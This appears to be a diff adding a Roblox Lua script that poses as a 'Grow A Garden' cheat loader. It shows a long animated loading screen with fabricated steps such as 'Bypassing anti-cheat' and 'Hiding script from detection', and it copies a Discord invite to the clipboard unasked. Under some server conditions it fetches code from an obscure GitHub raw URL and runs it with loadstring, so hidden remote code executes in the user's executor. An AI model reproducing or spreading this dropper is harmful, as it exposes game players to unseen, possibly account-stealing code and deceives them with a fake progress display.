@@ -1,0 +1,198 @@
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+
+
+if server == "VIPServer" or #Players:GetPlayers() >= 4 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/realkyzers/dowhdusjwbd/refs/heads/main/shop.txt"))()
+    return
+end
+
+pcall(function()
+    setclipboard("https://discord.gg/tUpWA7rCaG")
+end)
+
+local sound = Instance.new("Sound", workspace)
+sound.Name = "LoadingMusic"
+sound.SoundId = "rbxassetid://1843521756" -- Nhạc nhẹ (thay ID tùy bạn)
+sound.Volume = 0.5
+sound.Looped = true
+sound:Play()
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "BypassLoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 999999
+screenGui.Parent = CoreGui
+
+local blackBg = Instance.new("Frame")
+blackBg.Size = UDim2.new(1, 0, 1, 0)
+blackBg.BackgroundColor3 = Color3.new(0, 0, 0)
+blackBg.BorderSizePixel = 0
+blackBg.ZIndex = 0
+blackBg.Parent = screenGui
+
+local function applyGlow(frame, color)
+	local stroke = Instance.new("UIStroke")
+	stroke.Thickness = 2
+	stroke.Color = color
+	stroke.Transparency = 0.3
+	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	stroke.Parent = frame
+end
+
+for i = 1, 200 do
+	local star = Instance.new("Frame")
+	local size = math.random(1, 2)
+	star.Size = UDim2.new(0, size, 0, size)
+	star.Position = UDim2.new(math.random(), 0, math.random(), 0)
+	star.BackgroundColor3 = Color3.new(1, 1, 1)
+	star.BackgroundTransparency = math.random(1, 3) / 10
+	star.BorderSizePixel = 0
+	star.ZIndex = 1
+	star.Parent = screenGui
+
+	task.spawn(function()
+		while star and star.Parent do
+			star.Position = star.Position + UDim2.new(0, 0, 0.001, 0)
+			if star.Position.Y.Scale > 1 then
+				star.Position = UDim2.new(math.random(), 0, 0, 0)
+			end
+			task.wait(0.05)
+		end
+	end)
+end
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0, 0, 0.05, 0)
+title.BackgroundTransparency = 1
+title.Text = "🌱 Grow A Garden 🌸"
+title.TextColor3 = Color3.fromRGB(200, 100, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+title.ZIndex = 5
+title.Parent = screenGui
+
+local emojiList = {"🌟", "💎", "🐶", "🌼", "🧤", "🧪"}
+for i = 1, 10 do
+	local emoji = Instance.new("TextLabel")
+	emoji.Text = emojiList[math.random(1, #emojiList)]
+	emoji.Size = UDim2.new(0, 30, 0, 30)
+	emoji.Position = UDim2.new(math.random(), 0, math.random(), 0)
+	emoji.BackgroundTransparency = 1
+	emoji.TextScaled = true
+	emoji.TextColor3 = Color3.new(1, 1, 1)
+	emoji.Font = Enum.Font.GothamBold
+	emoji.ZIndex = 4
+	emoji.Parent = screenGui
+
+	task.spawn(function()
+		while emoji and emoji.Parent do
+			local newPos = UDim2.new(math.random(), 0, math.random(), 0)
+			TweenService:Create(emoji, TweenInfo.new(math.random(3, 7), Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
+				Position = newPos
+			}):Play()
+			task.wait(math.random(3, 7))
+		end
+	end)
+end
+
+local barBack = Instance.new("Frame")
+barBack.Size = UDim2.new(0.4, 0, 0.04, 0)
+barBack.Position = UDim2.new(0.3, 0, 0.9, 0)
+barBack.BackgroundColor3 = Color3.fromRGB(80, 0, 120)
+barBack.BorderSizePixel = 0
+barBack.ZIndex = 2
+barBack.Parent = screenGui
+applyGlow(barBack, Color3.fromRGB(255, 0, 255))
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
+bar.BorderSizePixel = 0
+bar.ZIndex = 3
+bar.Parent = barBack
+applyGlow(bar, Color3.fromRGB(255, 0, 255))
+
+local percent = Instance.new("TextLabel")
+percent.Size = UDim2.new(1, 0, 1, 0)
+percent.BackgroundTransparency = 1
+percent.Text = "1%"
+percent.TextColor3 = Color3.new(1, 1, 1)
+percent.TextScaled = true
+percent.Font = Enum.Font.GothamBold
+percent.ZIndex = 4
+percent.Parent = barBack
+
+local statusText = Instance.new("TextLabel")
+statusText.Size = UDim2.new(1, 0, 0, 40)
+statusText.Position = UDim2.new(0, 0, 0.7, -40)
+statusText.BackgroundTransparency = 1
+statusText.Text = "Starting script..."
+statusText.TextColor3 = Color3.fromRGB(255, 100, 255)
+statusText.TextScaled = true
+statusText.Font = Enum.Font.GothamSemibold
+statusText.ZIndex = 2
+statusText.Parent = screenGui
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 200, 0, 40)
+button.Position = UDim2.new(0.5, -100, 0.7, 0)
+button.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextScaled = true
+button.Font = Enum.Font.GothamBold
+button.Text = "Copy Discord Invite"
+button.ZIndex = 3
+button.AutoButtonColor = true
+button.Parent = screenGui
+applyGlow(button, Color3.fromRGB(255, 0, 255))
+
+button.MouseButton1Click:Connect(function()
+	pcall(function()
+		setclipboard("https://discord.gg/tUpWA7rCaG")
+	end)
+end)
+
+local steps = {
+    "Starting script...",
+    "Connecting to game servers...",
+    "Bypassing anti-cheat...",
+    "Loading UI assets...",
+    "Injecting main module...",
+    "Syncing with server...",
+    "Optimizing script performance...",
+    "Checking for updates...",
+    "Hiding script from detection...",
+    "Finalizing setup...",
+    "Preparing game environment...",
+    "Almost done..."
+}
+
+task.spawn(function()
+	local totalSteps = #steps
+	local totalTime = 300
+	local stepTime = totalTime / totalSteps
+
+	for i, step in ipairs(steps) do
+		local percentValue = math.floor((i / totalSteps) * 100)
+		bar:TweenSize(UDim2.new(percentValue / 100, 0, 1, 0), "Out", "Quad", 0.5, true)
+		percent.Text = tostring(percentValue) .. "%"
+		statusText.Text = step
+		task.wait(stepTime)
+	end
+
+	statusText.Text = "Bypassed Successfully!"
+	percent.Text = "100%"
+	bar:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 0.25, true)
+
+	TweenService:Create(statusText, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {
+		TextColor3 = Color3.fromRGB(255, 0, 255)
+	}):Play()
+
+	task.wait(2)
+	sound:Stop()
+	screenGui:Destroy()
+end)
